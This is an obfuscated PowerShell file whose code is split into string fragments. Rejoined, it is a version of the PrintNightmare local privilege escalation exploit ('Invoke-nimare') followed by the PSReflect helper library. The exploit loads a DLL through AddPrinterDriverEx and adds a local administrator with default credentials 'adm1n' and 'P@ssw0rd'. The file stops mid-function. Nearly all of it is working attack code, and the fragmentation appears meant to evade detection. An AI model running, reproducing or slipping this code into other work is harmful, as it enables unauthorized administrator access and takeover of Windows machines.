$fragments = @('function In','voke-nimare','
{
    
   ',' param (
  ','      [stri','ng]$DriverN','ame = "Tota','lly Not Mal','icious",
  ','      [stri','ng]$NewUser',' = "",
    ','    [string',']$NewPasswo','rd = "",
  ','      [stri','ng]$DLL = "','"
    )

  ','  if ( $DLL',' -eq "" ){
','        $ni','mare_data =',' [byte[]](g','et_nimare_d','ll)
       ',' $encoder =',' New-Object',' System.Tex','t.UnicodeEn','coding

   ','     if ( $','NewUser -ne',' "" ) {
   ','         $N','ewUserBytes',' = $encoder','.GetBytes($','NewUser)
  ','          [','System.Buff','er]::BlockC','opy($NewUse','rBytes, 0, ','$nimare_dat','a, 0x32e20,',' $NewUserBy','tes.Length)','
          ','  $nimare_d','ata[0x32e20','+$NewUserBy','tes.Length]',' = 0
      ','      $nima','re_data[0x3','2e20+$NewUs','erBytes.Len','gth+1] = 0
','        } e','lse {
     ','       Writ','e-Host "[+]',' using defa','ult new use','r: adm1n"
 ','       }

 ','       if (',' $NewPasswo','rd -ne "" )',' {
        ','    $NewPas','swordBytes ','= $encoder.','GetBytes($N','ewPassword)','
          ','  [System.B','uffer]::Blo','ckCopy($New','PasswordByt','es, 0, $nim','are_data, 0','x32c20, $Ne','wPasswordBy','tes.Length)','
          ','  $nimare_d','ata[0x32c20','+$NewPasswo','rdBytes.Len','gth] = 0
  ','          $','nimare_data','[0x32c20+$N','ewPasswordB','ytes.Length','+1] = 0
   ','     } else',' {
        ','    Write-H','ost "[+] us','ing default',' new passwo','rd: P@ssw0r','d"
        ','}

        ','$DLL = [Sys','tem.IO.Path',']::GetTempP','ath() + "ni','mare.dll"
 ','       [Sys','tem.IO.File',']::WriteAll','Bytes($DLL,',' $nimare_da','ta)
       ',' Write-Host',' "[+] creat','ed payload ','at $DLL"
  ','      $dele','te_me = $tr','ue
    } el','se {
      ','  Write-Hos','t "[+] usin','g user-supp','lied payloa','d at $DLL"
','        Wri','te-Host "[!','] ignoring ','NewUser and',' NewPasswor','d arguments','"
        $','delete_me =',' $false
   ',' }

    $Mo','d = New-InM','emoryModule',' -ModuleNam','e "A$(Get-R','andom)"

  ','  $Function','Definitions',' = @(
     ',' (func wins','pool.drv Ad','dPrinterDri','verEx ([boo','l]) @([stri','ng], [Uint3','2], [IntPtr','], [Uint32]',') -Charset ','Auto -SetLa','stError),
 ','     (func ','winspool.dr','v EnumPrint','erDrivers([','bool]) @( [','string], [s','tring], [Ui','nt32], [Int','Ptr], [UInt','32], [Uint3','2].MakeByRe','fType(), [U','int32].Make','ByRefType()',') -Charset ','Auto -SetLa','stError)
  ','  )

    $T','ypes = $Fun','ctionDefini','tions | Add','-Win32Type ','-Module $Mo','d -Namespac','e ''Mod''

  ','  # Define ','custom stru','ctures for ','types creat','ed
    $DRI','VER_INFO_2 ','= struct $M','od DRIVER_I','NFO_2 @{
  ','      cVers','ion = field',' 0 Uint64;
','        pNa','me = field ','1 string -M','arshalAs @(','"LPTStr");
','        pEn','vironment =',' field 2 st','ring -Marsh','alAs @("LPT','Str");
    ','    pDriver','Path = fiel','d 3 string ','-MarshalAs ','@("LPTStr")',';
        p','DataFile = ','field 4 str','ing -Marsha','lAs @("LPTS','tr");
     ','   pConfigF','ile = field',' 5 string -','MarshalAs @','("LPTStr");','
    }

   ',' $winspool ','= $Types[''w','inspool.drv',''']
    $APD','_COPY_ALL_F','ILES = 0x00','000004

   ',' [Uint32]($','cbNeeded) =',' 0
    [Uin','t32]($cRetu','rned) = 0

','    if ( $w','inspool::En','umPrinterDr','ivers($null',', "Windows ','x64", 2, [I','ntPtr]::Zer','o, 0, [ref]','$cbNeeded, ','[ref]$cRetu','rned) ){
  ','      Write','-Host "[!] ','EnumPrinter','Drivers sho','uld fail!"
','        ret','urn
    }

','    [IntPtr',']$pAddr = [','System.Runt','ime.Interop','Services.Ma','rshal]::All','ocHGlobal([','Uint32]($cb','Needed))

 ','   if ( $wi','nspool::Enu','mPrinterDri','vers($null,',' "Windows x','64", 2, $pA','ddr, $cbNee','ded, [ref]$','cbNeeded, [','ref]$cRetur','ned) ){
   ','     $drive','r = [System','.Runtime.In','teropServic','es.Marshal]','::PtrToStru','cture($pAdd','r, [System.','Type]$DRIVE','R_INFO_2)
 ','   } else {','
        Wr','ite-Host "[','!] failed t','o get curre','nt driver l','ist"
      ','  [System.R','untime.Inte','ropServices','.Marshal]::','FreeHGlobal','($pAddr)
  ','      retur','n
    }

  ','  Write-Hos','t "[+] usin','g pDriverPa','th = `"$($d','river.pDriv','erPath)`""
','    [System','.Runtime.In','teropServic','es.Marshal]','::FreeHGlob','al($pAddr)
','
    $drive','r_info = Ne','w-Object $D','RIVER_INFO_','2
    $driv','er_info.cVe','rsion = 3
 ','   $driver_','info.pConfi','gFile = $DL','L
    $driv','er_info.pDa','taFile = $D','LL
    $dri','ver_info.pD','riverPath =',' $driver.pD','riverPath
 ','   $driver_','info.pEnvir','onment = "W','indows x64"','
    $drive','r_info.pNam','e = $Driver','Name

    $','pDriverInfo',' = [System.','Runtime.Int','eropService','s.Marshal]:',':AllocHGlob','al([System.','Runtime.Int','eropService','s.Marshal]:',':SizeOf($dr','iver_info))','
    [Syste','m.Runtime.I','nteropServi','ces.Marshal',']::Structur','eToPtr($dri','ver_info, $','pDriverInfo',', $false)

','    if ( $w','inspool::Ad','dPrinterDri','verEx($null',', 2, $pDriv','erInfo, $AP','D_COPY_ALL_','FILES -bor ','0x10 -bor 0','x8000) ) {
','        if ','( $delete_m','e ) {
     ','       Writ','e-Host "[+]',' added user',' $NewUser a','s local adm','inistrator"','
        } ','else {
    ','        Wri','te-Host "[+','] driver ap','pears to ha','ve been loa','ded!"
     ','   }
    } ','else {
    ','    #Write-','Error "[!] ','AddPrinterD','riverEx fai','led"
    }
','
    if ( $','delete_me )',' {
        ','Write-Host ','"[+] deleti','ng payload ','from $DLL"
','        Rem','ove-Item -F','orce $DLL
 ','   }
}


##','###########','###########','###########','###########','##########
','# Stolen fr','om PowerSpl','oit: https:','//github.co','m/PowerShel','lMafia/Powe','rSploit
###','###########','###########','###########','###########','#########

','###########','###########','###########','###########','###########','#
#
# PSRef','lect code f','or Windows ','API access
','# Author: @','mattifestat','ion
#   htt','ps://raw.gi','thubusercon','tent.com/ma','ttifestatio','n/PSReflect','/master/PSR','eflect.psm1','
#
########','###########','###########','###########','###########','####

funct','ion New-InM','emoryModule',' {
<#
.SYNO','PSIS
Create','s an in-mem','ory assembl','y and modul','e
Author: M','atthew Grae','ber (@matti','festation)
','License: BS','D 3-Clause
','Required De','pendencies:',' None
Optio','nal Depende','ncies: None','
.DESCRIPTI','ON
When def','ining custo','m enums, st','ructs, and ','unmanaged f','unctions, i','t is
necess','ary to asso','ciate to an',' assembly m','odule. This',' helper fun','ction
creat','es an in-me','mory module',' that can b','e passed to',' the ''enum''',',
''struct'',',' and Add-Wi','n32Type fun','ctions.
.PA','RAMETER Mod','uleName
Spe','cifies the ','desired nam','e for the i','n-memory as','sembly and ','module. If
','ModuleName ','is not prov','ided, it wi','ll default ','to a GUID.
','.EXAMPLE
$M','odule = New','-InMemoryMo','dule -Modul','eName Win32','
#>

    [D','iagnostics.','CodeAnalysi','s.SuppressM','essageAttri','bute(''PSUse','ShouldProce','ssForStateC','hangingFunc','tions'', '''')',']
    [Cmdl','etBinding()',']
    Param',' (
        ','[Parameter(','Position = ','0)]
       ',' [ValidateN','otNullOrEmp','ty()]
     ','   [String]','
        $M','oduleName =',' [Guid]::Ne','wGuid().ToS','tring()
   ',' )

    $Ap','pDomain = [','Reflection.','Assembly].A','ssembly.Get','Type(''Syste','m.AppDomain',''').GetPrope','rty(''Curren','tDomain'').G','etValue($nu','ll, @())
  ','  $LoadedAs','semblies = ','$AppDomain.','GetAssembli','es()

    f','oreach ($As','sembly in $','LoadedAssem','blies) {
  ','      if ($','Assembly.Fu','llName -and',' ($Assembly','.FullName.S','plit('','')[0','] -eq $Modu','leName)) {
','           ',' return $As','sembly
    ','    }
    }','

    $DynA','ssembly = N','ew-Object R','eflection.A','ssemblyName','($ModuleNam','e)
    $Dom','ain = $AppD','omain
    $','AssemblyBui','lder = $Dom','ain.DefineD','ynamicAssem','bly($DynAss','embly, ''Run',''')
    $Mod','uleBuilder ','= $Assembly','Builder.Def','ineDynamicM','odule($Modu','leName, $Fa','lse)

    r','eturn $Modu','leBuilder
}','

# A helpe','r function ','used to red','uce typing ','while defin','ing functio','n
# prototy','pes for Add','-Win32Type.','
function f','unc {
    P','aram (
    ','    [Parame','ter(Positio','n = 0, Mand','atory = $Tr','ue)]
      ','  [String]
','        $Dl','lName,

   ','     [Param','eter(Positi','on = 1, Man','datory = $T','rue)]
     ','   [string]','
        $F','unctionName',',

        ','[Parameter(','Position = ','2, Mandator','y = $True)]','
        [T','ype]
      ','  $ReturnTy','pe,

      ','  [Paramete','r(Position ','= 3)]
     ','   [Type[]]','
        $P','arameterTyp','es,

      ','  [Paramete','r(Position ','= 4)]
     ','   [Runtime','.InteropSer','vices.Calli','ngConventio','n]
        ','$NativeCall','ingConventi','on,

      ','  [Paramete','r(Position ','= 5)]
     ','   [Runtime','.InteropSer','vices.CharS','et]
       ',' $Charset,
','
        [S','tring]
    ','    $EntryP','oint,

    ','    [Switch',']
        $','SetLastErro','r
    )

  ','  $Properti','es = @{
   ','     DllNam','e = $DllNam','e
        F','unctionName',' = $Functio','nName
     ','   ReturnTy','pe = $Retur','nType
    }','

    if ($','ParameterTy','pes) { $Pro','perties[''Pa','rameterType','s''] = $Para','meterTypes ','}
    if ($','NativeCalli','ngConventio','n) { $Prope','rties[''Nati','veCallingCo','nvention''] ','= $NativeCa','llingConven','tion }
    ','if ($Charse','t) { $Prope','rties[''Char','set''] = $Ch','arset }
   ',' if ($SetLa','stError) { ','$Properties','[''SetLastEr','ror''] = $Se','tLastError ','}
    if ($','EntryPoint)',' { $Propert','ies[''EntryP','oint''] = $E','ntryPoint }','

    New-O','bject PSObj','ect -Proper','ty $Propert','ies
}

func','tion Add-Wi','n32Type
{
<','#
.SYNOPSIS','
Creates a ','.NET type f','or an unman','aged Win32 ','function.
A','uthor: Matt','hew Graeber',' (@mattifes','tation)
Lic','ense: BSD 3','-Clause
Req','uired Depen','dencies: No','ne
Optional',' Dependenci','es: func
.D','ESCRIPTION
','Add-Win32Ty','pe enables ','you to easi','ly interact',' with unman','aged (i.e.
','Win32 unman','aged) funct','ions in Pow','erShell. Af','ter providi','ng
Add-Win3','2Type with ','a function ','signature, ','a .NET type',' is created','
using refl','ection (i.e','. csc.exe i','s never cal','led like wi','th Add-Type',').
The ''fun','c'' helper f','unction can',' be used to',' reduce typ','ing when de','fining
mult','iple functi','on definiti','ons.
.PARAM','ETER DllNam','e
The name ','of the DLL.','
.PARAMETER',' FunctionNa','me
The name',' of the tar','get functio','n.
.PARAMET','ER EntryPoi','nt
The DLL ','export func','tion name. ','This argume','nt should b','e specified',' if the
spe','cified func','tion name i','s different',' than the n','ame of the ','exported
fu','nction.
.PA','RAMETER Ret','urnType
The',' return typ','e of the fu','nction.
.PA','RAMETER Par','ameterTypes','
The functi','on paramete','rs.
.PARAME','TER NativeC','allingConve','ntion
Speci','fies the na','tive callin','g conventio','n of the fu','nction. Def','aults to
st','dcall.
.PAR','AMETER Char','set
If you ','need to exp','licitly cal','l an ''A'' or',' ''W'' Win32 ','function, y','ou can
spec','ify the cha','racter set.','
.PARAMETER',' SetLastErr','or
Indicate','s whether t','he callee c','alls the Se','tLastError ','Win32 API
f','unction bef','ore returni','ng from the',' attributed',' method.
.P','ARAMETER Mo','dule
The in','-memory mod','ule that wi','ll host the',' functions.',' Use
New-In','MemoryModul','e to define',' an in-memo','ry module.
','.PARAMETER ','Namespace
A','n optional ','namespace t','o prepend t','o the type.',' Add-Win32T','ype default','s
to a name','space consi','sting only ','of the name',' of the DLL','.
.EXAMPLE
','$Mod = New-','InMemoryMod','ule -Module','Name Win32
','$FunctionDe','finitions =',' @(
  (func',' kernel32 G','etProcAddre','ss ([IntPtr',']) @([IntPt','r], [String',']) -Charset',' Ansi -SetL','astError),
','  (func ker','nel32 GetMo','duleHandle ','([Intptr]) ','@([String])',' -SetLastEr','ror),
  (fu','nc ntdll Rt','lGetCurrent','Peb ([IntPt','r]) @())
)
','$Types = $F','unctionDefi','nitions | A','dd-Win32Typ','e -Module $','Mod -Namesp','ace ''Win32''','
$Kernel32 ','= $Types[''k','ernel32'']
$','Ntdll = $Ty','pes[''ntdll''',']
$Ntdll::R','tlGetCurren','tPeb()
$ntd','llbase = $K','ernel32::Ge','tModuleHand','le(''ntdll'')','
$Kernel32:',':GetProcAdd','ress($ntdll','base, ''RtlG','etCurrentPe','b'')
.NOTES
','Inspired by',' Lee Holmes',''' Invoke-Wi','ndowsApi ht','tp://poshco','de.org/2189','
When defin','ing multipl','e function ','prototypes,',' it is idea','l to provid','e
Add-Win32','Type with a','n array of ','function si','gnatures. T','hat way, th','ey
are all ','incorporate','d into the ','same in-mem','ory module.','
#>

    [O','utputType([','Hashtable])',']
    Param','(
        [','Parameter(M','andatory=$T','rue, ValueF','romPipeline','ByPropertyN','ame=$True)]','
        [S','tring]
    ','    $DllNam','e,

       ',' [Parameter','(Mandatory=','$True, Valu','eFromPipeli','neByPropert','yName=$True',')]
        ','[String]
  ','      $Func','tionName,

','        [Pa','rameter(Val','ueFromPipel','ineByProper','tyName=$Tru','e)]
       ',' [String]
 ','       $Ent','ryPoint,

 ','       [Par','ameter(Mand','atory=$True',', ValueFrom','PipelineByP','ropertyName','=$True)]
  ','      [Type',']
        $','ReturnType,','

        [','Parameter(V','alueFromPip','elineByProp','ertyName=$T','rue)]
     ','   [Type[]]','
        $P','arameterTyp','es,

      ','  [Paramete','r(ValueFrom','PipelineByP','ropertyName','=$True)]
  ','      [Runt','ime.Interop','Services.Ca','llingConven','tion]
     ','   $NativeC','allingConve','ntion = [Ru','ntime.Inter','opServices.','CallingConv','ention]::St','dCall,

   ','     [Param','eter(ValueF','romPipeline','ByPropertyN','ame=$True)]','
        [R','untime.Inte','ropServices','.CharSet]
 ','       $Cha','rset = [Run','time.Intero','pServices.C','harSet]::Au','to,

      ','  [Paramete','r(ValueFrom','PipelineByP','ropertyName','=$True)]
  ','      [Swit','ch]
       ',' $SetLastEr','ror,

     ','   [Paramet','er(Mandator','y=$True)]
 ','       [Val','idateScript','({($_ -is [','Reflection.','Emit.Module','Builder]) -','or ($_ -is ','[Reflection','.Assembly])','})]
       ',' $Module,

','        [Va','lidateNotNu','ll()]
     ','   [String]','
        $N','amespace = ','''''
    )

 ','   BEGIN
  ','  {
       ',' $TypeHash ','= @{}
    }','

    PROCE','SS
    {
  ','      if ($','Module -is ','[Reflection','.Assembly])','
        {
','           ',' if ($Names','pace)
     ','       {
  ','           ','   $TypeHas','h[$DllName]',' = $Module.','GetType("$N','amespace.$D','llName")
  ','          }','
          ','  else
    ','        {
 ','           ','    $TypeHa','sh[$DllName','] = $Module','.GetType($D','llName)
   ','         }
','        }
 ','       else','
        {
','           ',' # Define o','ne type for',' each DLL
 ','           ','if (!$TypeH','ash.Contain','sKey($DllNa','me))
      ','      {
   ','           ','  if ($Name','space)
    ','           ',' {
        ','           ',' $TypeHash[','$DllName] =',' $Module.De','fineType("$','Namespace.$','DllName", ''','Public,Befo','reFieldInit',''')
        ','        }
 ','           ','    else
  ','           ','   {
      ','           ','   $TypeHas','h[$DllName]',' = $Module.','DefineType(','$DllName, ''','Public,Befo','reFieldInit',''')
        ','        }
 ','           ','}

        ','    $Method',' = $TypeHas','h[$DllName]','.DefineMeth','od(
       ','         $F','unctionName',',
         ','       ''Pub','lic,Static,','PinvokeImpl',''',
        ','        $Re','turnType,
 ','           ','    $Parame','terTypes)

','           ',' # Make eac','h ByRef par','ameter an O','ut paramete','r
         ','   $i = 1
 ','           ','foreach($Pa','rameter in ','$ParameterT','ypes)
     ','       {
  ','           ','   if ($Par','ameter.IsBy','Ref)
      ','          {','
          ','          [','void] $Meth','od.DefinePa','rameter($i,',' ''Out'', $nu','ll)
       ','         }
','
          ','      $i++
','           ',' }

       ','     $DllIm','port = [Run','time.Intero','pServices.D','llImportAtt','ribute]
   ','         $S','etLastError','Field = $Dl','lImport.Get','Field(''SetL','astError'')
','           ',' $CallingCo','nventionFie','ld = $DllIm','port.GetFie','ld(''Calling','Convention''',')
         ','   $Charset','Field = $Dl','lImport.Get','Field(''Char','Set'')
     ','       $Ent','ryPointFiel','d = $DllImp','ort.GetFiel','d(''EntryPoi','nt'')
      ','      if ($','SetLastErro','r) { $SLEVa','lue = $True',' } else { $','SLEValue = ','$False }

 ','           ','if ($PSBoun','dParameters','[''EntryPoin','t'']) { $Exp','ortedFuncNa','me = $Entry','Point } els','e { $Export','edFuncName ','= $Function','Name }

   ','         # ','Equivalent ','to C# versi','on of [DllI','mport(DllNa','me)]
      ','      $Cons','tructor = [','Runtime.Int','eropService','s.DllImport','Attribute].','GetConstruc','tor([String','])
        ','    $DllImp','ortAttribut','e = New-Obj','ect Reflect','ion.Emit.Cu','stomAttribu','teBuilder($','Constructor',',
         ','       $Dll','Name, [Refl','ection.Prop','ertyInfo[]]',' @(), [Obje','ct[]] @(),
','           ','     [Refle','ction.Field','Info[]] @($','SetLastErro','rField,
   ','           ','           ','           ','       $Cal','lingConvent','ionField,
 ','           ','           ','           ','         $C','harsetField',',
         ','           ','           ','           ',' $EntryPoin','tField),
  ','           ','   [Object[',']] @($SLEVa','lue,
      ','           ','           ',' ([Runtime.','InteropServ','ices.Callin','gConvention','] $NativeCa','llingConven','tion),
    ','           ','           ','   ([Runtim','e.InteropSe','rvices.Char','Set] $Chars','et),
      ','           ','           ',' $ExportedF','uncName))

','           ',' $Method.Se','tCustomAttr','ibute($DllI','mportAttrib','ute)
      ','  }
    }

','    END
   ',' {
        ','if ($Module',' -is [Refle','ction.Assem','bly])
     ','   {
      ','      retur','n $TypeHash','
        }
','
        $R','eturnTypes ','= @{}

    ','    foreach',' ($Key in $','TypeHash.Ke','ys)
       ',' {
        ','    $Type =',' $TypeHash[','$Key].Creat','eType()

  ','          $','ReturnTypes','[$Key] = $T','ype
       ',' }

       ',' return $Re','turnTypes
 ','   }
}


fu','nction psen','um {
<#
.SY','NOPSIS
Crea','tes an in-m','emory enume','ration for ','use in your',' PowerShell',' session.
A','uthor: Matt','hew Graeber',' (@mattifes','tation)
Lic','ense: BSD 3','-Clause
Req','uired Depen','dencies: No','ne
Optional',' Dependenci','es: None
.D','ESCRIPTION
','The ''psenum',''' function ','facilitates',' the creati','on of enums',' entirely i','n
memory us','ing as clos','e to a "C s','tyle" as Po','werShell wi','ll allow.
.','PARAMETER M','odule
The i','n-memory mo','dule that w','ill host th','e enum. Use','
New-InMemo','ryModule to',' define an ','in-memory m','odule.
.PAR','AMETER Full','Name
The fu','lly-qualifi','ed name of ','the enum.
.','PARAMETER T','ype
The typ','e of each e','num element','.
.PARAMETE','R EnumEleme','nts
A hasht','able of enu','m elements.','
.PARAMETER',' Bitfield
S','pecifies th','at the enum',' should be ','treated as ','a bitfield.','
.EXAMPLE
$','Mod = New-I','nMemoryModu','le -ModuleN','ame Win32
$','ImageSubsys','tem = psenu','m $Mod PE.I','MAGE_SUBSYS','TEM UInt16 ','@{
    UNKN','OWN =      ','           ',' 0
    NATI','VE =       ','           ',' 1 # Image ','doesn''t req','uire a subs','ystem.
    ','WINDOWS_GUI',' =         ','     2 # Im','age runs in',' the Window','s GUI subsy','stem.
    W','INDOWS_CUI ','=          ','    3 # Ima','ge runs in ','the Windows',' character ','subsystem.
','    OS2_CUI',' =         ','         5 ','# Image run','s in the OS','/2 characte','r subsystem','.
    POSIX','_CUI =     ','           ','7 # Image r','uns in the ','Posix chara','cter subsys','tem.
    NA','TIVE_WINDOW','S =        ','   8 # Imag','e is a nati','ve Win9x dr','iver.
    W','INDOWS_CE_G','UI =       ','    9 # Ima','ge runs in ','the Windows',' CE subsyst','em.
    EFI','_APPLICATIO','N =        ','  10
    EF','I_BOOT_SERV','ICE_DRIVER ','=  11
    E','FI_RUNTIME_','DRIVER =   ','    12
    ','EFI_ROM =  ','           ','     13
   ',' XBOX =    ','           ','      14
  ','  WINDOWS_B','OOT_APPLICA','TION = 16
}','
.NOTES
Pow','erShell pur','ists may di','sagree with',' the naming',' of this fu','nction but
','again, this',' was develo','ped in such',' a way so a','s to emulat','e a "C styl','e"
definiti','on as close','ly as possi','ble. Sorry,',' I''m not go','ing to name',' it
New-Enu','m. :P
#>

 ','   [OutputT','ype([Type])',']
    Param',' (
        ','[Parameter(','Position = ','0, Mandator','y=$True)]
 ','       [Val','idateScript','({($_ -is [','Reflection.','Emit.Module','Builder]) -','or ($_ -is ','[Reflection','.Assembly])','})]
       ',' $Module,

','        [Pa','rameter(Pos','ition = 1, ','Mandatory=$','True)]
    ','    [Valida','teNotNullOr','Empty()]
  ','      [Stri','ng]
       ',' $FullName,','

        [','Parameter(P','osition = 2',', Mandatory','=$True)]
  ','      [Type',']
        $','Type,

    ','    [Parame','ter(Positio','n = 3, Mand','atory=$True',')]
        ','[ValidateNo','tNullOrEmpt','y()]
      ','  [Hashtabl','e]
        ','$EnumElemen','ts,

      ','  [Switch]
','        $Bi','tfield
    ',')

    if (','$Module -is',' [Reflectio','n.Assembly]',')
    {
   ','     return',' ($Module.G','etType($Ful','lName))
   ',' }

    $En','umType = $T','ype -as [Ty','pe]

    $E','numBuilder ','= $Module.D','efineEnum($','FullName, ''','Public'', $E','numType)

 ','   if ($Bit','field)
    ','{
        $','FlagsConstr','uctor = [Fl','agsAttribut','e].GetConst','ructor(@())','
        $F','lagsCustomA','ttribute = ','New-Object ','Reflection.','Emit.Custom','AttributeBu','ilder($Flag','sConstructo','r, @())
   ','     $EnumB','uilder.SetC','ustomAttrib','ute($FlagsC','ustomAttrib','ute)
    }
','
    foreac','h ($Key in ','$EnumElemen','ts.Keys)
  ','  {
       ',' # Apply th','e specified',' enum type ','to each ele','ment
      ','  $null = $','EnumBuilder','.DefineLite','ral($Key, $','EnumElement','s[$Key] -as',' $EnumType)','
    }

   ',' $EnumBuild','er.CreateTy','pe()
}


# ','A helper fu','nction used',' to reduce ','typing whil','e defining ','struct
# fi','elds.
funct','ion field {','
    Param ','(
        [','Parameter(P','osition = 0',', Mandatory','=$True)]
  ','      [UInt','16]
       ',' $Position,','

        [','Parameter(P','osition = 1',', Mandatory','=$True)]
  ','      [Type',']
        $','Type,

    ','    [Parame','ter(Positio','n = 2)]
   ','     [UInt1','6]
        ','$Offset,

 ','       [Obj','ect[]]
    ','    $Marsha','lAs
    )

','    @{
    ','    Positio','n = $Positi','on
        ','Type = $Typ','e -as [Type',']
        O','ffset = $Of','fset
      ','  MarshalAs',' = $Marshal','As
    }
}
','

function ','struct
{
<#','
.SYNOPSIS
','Creates an ','in-memory s','truct for u','se in your ','PowerShell ','session.
Au','thor: Matth','ew Graeber ','(@mattifest','ation)
Lice','nse: BSD 3-','Clause
Requ','ired Depend','encies: Non','e
Optional ','Dependencie','s: field
.D','ESCRIPTION
','The ''struct',''' function ','facilitates',' the creati','on of struc','ts entirely',' in
memory ','using as cl','ose to a "C',' style" as ','PowerShell ','will allow.',' Struct
fie','lds are spe','cified usin','g a hashtab','le where ea','ch field of',' the struct','
is compros','ed of the o','rder in whi','ch it shoul','d be define','d, its .NET','
type, and ','optionally,',' its offset',' and specia','l marshalin','g attribute','s.
One of t','he features',' of ''struct',''' is that a','fter your s','truct is de','fined,
it w','ill come wi','th a built-','in GetSize ','method as w','ell as an e','xplicit
con','verter so t','hat you can',' easily cas','t an IntPtr',' to the str','uct without','
relying up','on calling ','SizeOf and/','or PtrToStr','ucture in t','he Marshal
','class.
.PAR','AMETER Modu','le
The in-m','emory modul','e that will',' host the s','truct. Use
','New-InMemor','yModule to ','define an i','n-memory mo','dule.
.PARA','METER FullN','ame
The ful','ly-qualifie','d name of t','he struct.
','.PARAMETER ','StructField','s
A hashtab','le of field','s. Use the ','''field'' hel','per functio','n to ease
d','efining eac','h field.
.P','ARAMETER Pa','ckingSize
S','pecifies th','e memory al','ignment of ','fields.
.PA','RAMETER Exp','licitLayout','
Indicates ','that an exp','licit offse','t for each ','field will ','be specifie','d.
.EXAMPLE','
$Mod = New','-InMemoryMo','dule -Modul','eName Win32','
$ImageDosS','ignature = ','psenum $Mod',' PE.IMAGE_D','OS_SIGNATUR','E UInt16 @{','
    DOS_SI','GNATURE =  ','  0x5A4D
  ','  OS2_SIGNA','TURE =    0','x454E
    O','S2_SIGNATUR','E_LE = 0x45','4C
    VXD_','SIGNATURE =','    0x454C
','}
$ImageDos','Header = st','ruct $Mod P','E.IMAGE_DOS','_HEADER @{
','    e_magic',' =    field',' 0 $ImageDo','sSignature
','    e_cblp ','=     field',' 1 UInt16
 ','   e_cp =  ','     field ','2 UInt16
  ','  e_crlc = ','    field 3',' UInt16
   ',' e_cparhdr ','=  field 4 ','UInt16
    ','e_minalloc ','= field 5 U','Int16
    e','_maxalloc =',' field 6 UI','nt16
    e_','ss =       ','field 7 UIn','t16
    e_s','p =       f','ield 8 UInt','16
    e_cs','um =     fi','eld 9 UInt1','6
    e_ip ','=       fie','ld 10 UInt1','6
    e_cs ','=       fie','ld 11 UInt1','6
    e_lfa','rlc =   fie','ld 12 UInt1','6
    e_ovn','o =     fie','ld 13 UInt1','6
    e_res',' =      fie','ld 14 UInt1','6[] -Marsha','lAs @(''ByVa','lArray'', 4)','
    e_oemi','d =    fiel','d 15 UInt16','
    e_oemi','nfo =  fiel','d 16 UInt16','
    e_res2',' =     fiel','d 17 UInt16','[] -Marshal','As @(''ByVal','Array'', 10)','
    e_lfan','ew =   fiel','d 18 Int32
','}
# Example',' of using a','n explicit ','layout in o','rder to cre','ate a union','.
$TestUnio','n = struct ','$Mod TestUn','ion @{
    ','field1 = fi','eld 0 UInt3','2 0
    fie','ld2 = field',' 1 IntPtr 0','
} -Explici','tLayout
.NO','TES
PowerSh','ell purists',' may disagr','ee with the',' naming of ','this functi','on but
agai','n, this was',' developed ','in such a w','ay so as to',' emulate a ','"C style"
d','efinition a','s closely a','s possible.',' Sorry, I''m',' not going ','to name it
','New-Struct.',' :P
#>

   ',' [OutputTyp','e([Type])]
','    Param (','
        [P','arameter(Po','sition = 1,',' Mandatory=','$True)]
   ','     [Valid','ateScript({','($_ -is [Re','flection.Em','it.ModuleBu','ilder]) -or',' ($_ -is [R','eflection.A','ssembly])})',']
        $','Module,

  ','      [Para','meter(Posit','ion = 2, Ma','ndatory=$Tr','ue)]
      ','  [Validate','NotNullOrEm','pty()]
    ','    [String',']
        $','FullName,

','        [Pa','rameter(Pos','ition = 3, ','Mandatory=$','True)]
    ','    [Valida','teNotNullOr','Empty()]
  ','      [Hash','table]
    ','    $Struct','Fields,

  ','      [Refl','ection.Emit','.PackingSiz','e]
        ','$PackingSiz','e = [Reflec','tion.Emit.P','ackingSize]','::Unspecifi','ed,

      ','  [Switch]
','        $Ex','plicitLayou','t
    )

  ','  if ($Modu','le -is [Ref','lection.Ass','embly])
   ',' {
        ','return ($Mo','dule.GetTyp','e($FullName','))
    }

 ','   [Reflect','ion.TypeAtt','ributes] $S','tructAttrib','utes = ''Ans','iClass,
   ','     Class,','
        Pu','blic,
     ','   Sealed,
','        Bef','oreFieldIni','t''

    if ','($ExplicitL','ayout)
    ','{
        $','StructAttri','butes = $St','ructAttribu','tes -bor [R','eflection.T','ypeAttribut','es]::Explic','itLayout
  ','  }
    els','e
    {
   ','     $Struc','tAttributes',' = $StructA','ttributes -','bor [Reflec','tion.TypeAt','tributes]::','SequentialL','ayout
    }','

    $Stru','ctBuilder =',' $Module.De','fineType($F','ullName, $S','tructAttrib','utes, [Valu','eType], $Pa','ckingSize)
','    $Constr','uctorInfo =',' [Runtime.I','nteropServi','ces.Marshal','AsAttribute','].GetConstr','uctors()[0]','
    $SizeC','onst = @([R','untime.Inte','ropServices','.MarshalAsA','ttribute].G','etField(''Si','zeConst''))
','
    $Field','s = New-Obj','ect Hashtab','le[]($Struc','tFields.Cou','nt)

    # ','Sort each f','ield accord','ing to the ','orders spec','ified
    #',' Unfortunat','ely, PSv2 d','oesn''t have',' the luxury',' of the
   ',' # hashtabl','e [Ordered]',' accelerato','r.
    fore','ach ($Field',' in $Struct','Fields.Keys',')
    {
   ','     $Index',' = $StructF','ields[$Fiel','d][''Positio','n'']
       ',' $Fields[$I','ndex] = @{F','ieldName = ','$Field; Pro','perties = $','StructField','s[$Field]}
','    }

    ','foreach ($F','ield in $Fi','elds)
    {','
        $F','ieldName = ','$Field[''Fie','ldName'']
  ','      $Fiel','dProp = $Fi','eld[''Proper','ties'']

   ','     $Offse','t = $FieldP','rop[''Offset',''']
        ','$Type = $Fi','eldProp[''Ty','pe'']
      ','  $MarshalA','s = $FieldP','rop[''Marsha','lAs'']

    ','    $NewFie','ld = $Struc','tBuilder.De','fineField($','FieldName, ','$Type, ''Pub','lic'')

    ','    if ($Ma','rshalAs)
  ','      {
   ','         $U','nmanagedTyp','e = $Marsha','lAs[0] -as ','([Runtime.I','nteropServi','ces.Unmanag','edType])
  ','          i','f ($Marshal','As[1])
    ','        {
 ','           ','    $Size =',' $MarshalAs','[1]
       ','         $A','ttribBuilde','r = New-Obj','ect Reflect','ion.Emit.Cu','stomAttribu','teBuilder($','Constructor','Info,
     ','           ','    $Unmana','gedType, $S','izeConst, @','($Size))
  ','          }','
          ','  else
    ','        {
 ','           ','    $Attrib','Builder = N','ew-Object R','eflection.E','mit.CustomA','ttributeBui','lder($Const','ructorInfo,',' [Object[]]',' @($Unmanag','edType))
  ','          }','

         ','   $NewFiel','d.SetCustom','Attribute($','AttribBuild','er)
       ',' }

       ',' if ($Expli','citLayout) ','{ $NewField','.SetOffset(','$Offset) }
